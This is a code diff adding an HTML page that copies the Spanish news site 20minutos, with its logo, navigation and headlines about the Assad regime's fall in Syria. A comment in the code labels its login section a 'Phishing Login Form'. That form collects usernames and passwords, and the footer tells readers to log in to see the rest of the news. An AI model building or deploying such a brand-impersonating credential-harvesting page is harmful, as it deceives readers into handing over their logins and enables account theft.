@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>20minutos - Réplica</title>
+  <link rel="stylesheet" href="/css/fonts.css">
+  <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+  <header class="top-header">
+    <div class="header-inner">
+      <button class="menu-button" aria-label="Toggle Menu">&#9776;</button>
+      <a href="/" class="site-logo">
+        <img src="/images/logo-horizontal-20m.svg" alt="20minutos">
+      </a>
+      <div class="user-options">
+        <span>EDICIÓN <strong>ESPAÑA</strong></span>
+        <div class="user-icon">👤</div>
+      </div>
+    </div>
+  </header>
+
+  <nav class="main-nav">
+    <ul>
+      <li><a href="#">NACIONAL</a></li>
+      <li><a href="#">INTERNACIONAL</a></li>
+      <li><a href="#">DEPORTES</a></li>
+      <li><a href="#">OPINIÓN</a></li>
+      <li><a href="#">TELE</a></li>
+      <li><a href="#">GENTE</a></li>
+      <li><a href="#">MOTOR</a></li>
+      <li><a href="#">20BITS</a></li>
+      <li><a href="#">ED. IMPRESA</a></li>
+    </ul>
+  </nav>
+
+  <main class="content">
+    <section class="highlight">
+      <div class="highlight-tags">
+        <span class="tag rojo">DIRECTO</span>
+        <span class="tag azul">SIRIA</span>
+      </div>
+      <h1 class="main-headline">
+        Los rebeldes sirios tumban el régimen de Al Asad, que huye del país
+      </h1>
+      <p class="sub-headline">
+        Asaltan el palacio presidencial de Al Asad en Damasco y saquean sus pertenencias
+      </p>
+    </section>
+
+    <!-- Layout Container: Left Column (main story), Right Column (secondary stories) -->
+    <div class="layout">
+      <div class="main-feature">
+        <article class="featured-article">
+          <h2 class="article-title">Directo: Los rebeldes sirios tumban el régimen de Al Asad</h2>
+          <p class="article-summary">Los acontecimientos se han desarrollado rápidamente en Damasco...</p>
+        </article>
+
+        <article class="featured-article secondary">
+          <h2 class="article-title">Rusia confirma salida de Al Asad</h2>
+          <p class="article-summary">El Kremlin pide una transferencia pacífica del poder en Siria...</p>
+        </article>
+
+        <section class="image-highlight">
+          <div class="image-container">
+            <img src="/images/bachar-al-asad.webp" alt="Bachar al Asad" class="headline-image">
+            <div class="image-caption">
+              <h2>Bachar al Asad y su familia huyen de Siria a Moscú, donde han recibido asilo</h2>
+            </div>
+          </div>
+        </section>
+      </div>
+
+      <aside class="sidebar">
+        <!-- Example of a secondary big story on the left site -->
+        <article class="side-article">
+          <h2 class="side-headline">La caída del régimen de Al Asad y su huida a Moscú abre una etapa de transición en Siria: "El futuro es nuestro"</h2>
+          <p class="byline">Jorge Martínez</p>
+          <p class="side-summary">– Albares, sobre los españoles en Siria: "Se encuentran bien, solo uno ha pedido salir del país"</p>
+          <img src="/images/celebran-image1.webp" alt="Secondary" class="side-image">
+        </article>
+      </aside>
+    </div>
+
+    <!-- Phishing Login Form -->
+    <section class="login-section">
+      <h2>Iniciar sesión</h2>
+      <form action="/login" method="POST">
+        <input type="text" name="username" placeholder="Usuario" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        <button type="submit">Entrar</button>
+      </form>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <p>© 20minutos 2024 - Todos los derechos reservados.</p>
+    <p style="margin-top: 10px; font-size: 14px; color: #666; text-align: center;">
+      Para ver el resto de las noticias, por favor <a href="#login" style="color: #0050A1; text-decoration: underline;">inicie sesión</a>.
+    </p>
+  </footer>
+
+  <script src="/js/main.js"></script>
+</body>
+</html>
